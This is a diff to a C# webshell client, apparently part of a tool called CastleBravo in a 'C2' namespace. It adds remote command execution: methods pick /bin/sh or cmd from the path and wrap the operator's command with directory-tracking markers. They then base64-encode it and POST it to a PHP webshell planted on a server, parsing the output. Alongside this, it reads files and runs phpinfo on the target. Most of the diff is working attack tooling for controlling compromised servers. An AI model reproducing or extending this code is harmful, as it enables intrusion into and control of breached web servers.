@@ -31,16 +31,33 @@ namespace C2.Business.CastleBravo.WebShellTool
             client.Encoding = Encoding.Default;
         }
 
+        public Tuple<string, string> CurrentCmdExcute()
+        {
+            List<string> paths = PHPIndex();
+            if (paths.Count == 0)
+                return Tuple.Create(string.Empty, string.Empty);
+
+            return Tuple.Create(paths[0], string.Empty);
+        }
+
+        public Tuple<string, string> CmdExcute(string excutePath, string command)
+        {   
+            bool isLinux = excutePath.StartsWith("/");
+            string cmdPath = isLinux ? "/bin/sh" : "cmd";//需要先判断是什么系统
+            string combineCommand = string.Format(isLinux ? "cd \"{0}\";{1};echo [S];pwd;echo [E]": "cd /d \"{0}\"&{1}&echo [S]&cd&echo [E]", excutePath, command);
+            string result = PHPShell(cmdPath, combineCommand, command);
+
+            string[] tmp = result.Split(new string[] { "[S]" }, StringSplitOptions.None);
+            string output = isLinux ? tmp[0].Replace("\n","\r\n") : tmp[0];
+            string newPath = tmp[1].Split(new string[] { "[E]" }, StringSplitOptions.None)[0].Trim(new char[] { '\n', '\r' });
+
+            return Tuple.Create(newPath, output);
+
+        }
+
         public Tuple<string, List<WSFile>, List<string>> CurrentPathBrowse()
         {
             return PathBrowse(PHPIndex());
-        }
-
-
-        public string PHPInfo()
-        {
-            PayloadLog.Add("========获取php基础信息========");
-            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_INFO);
         }
 
         public Tuple<string, List<WSFile>, List<string>> PathBrowse(List<string> pathList)
@@ -72,6 +89,11 @@ namespace C2.Business.CastleBravo.WebShellTool
             }
             return Tuple.Create(path, pathFiles, broPaths);
         }
+        public string PHPInfo()
+        {
+            PayloadLog.Add("========获取php基础信息========");
+            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_INFO);
+        }
 
         private List<string> PHPIndex()
         {
@@ -83,7 +105,16 @@ namespace C2.Business.CastleBravo.WebShellTool
         private string PHPReadDict(string path)
         {
             PayloadLog.Add("========获取" + path + "文件========");
-            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_READDICT + "&" + versionSetting.PARAM1 + "=" + HttpUtility.UrlEncode(Convert.ToBase64String(Encoding.UTF8.GetBytes(path))));
+            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_READDICT + "&" + versionSetting.PARAM1 + "=" + TransStringToBase64(path));
+        }
+
+        private string PHPShell(string cmdPath, string combineCommand, string oriCommand)
+        {
+            PayloadLog.Add("========执行命令：" + oriCommand + "========");
+            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + 
+                            versionSetting.ACTION + "=" + versionSetting.PHP_SHELL + "&" + 
+                            versionSetting.PARAM1 + "=" + TransStringToBase64(cmdPath) + "&" +
+                            versionSetting.PARAM2 + "=" + TransStringToBase64(combineCommand));
         }
 
         private string PHPPost(string payload)
@@ -128,6 +159,11 @@ namespace C2.Business.CastleBravo.WebShellTool
             }
             catch { }
             return result;
+        }
+
+        private string TransStringToBase64(string str)
+        {
+            return HttpUtility.UrlEncode(Convert.ToBase64String(Encoding.UTF8.GetBytes(str)));
         }
     }
 
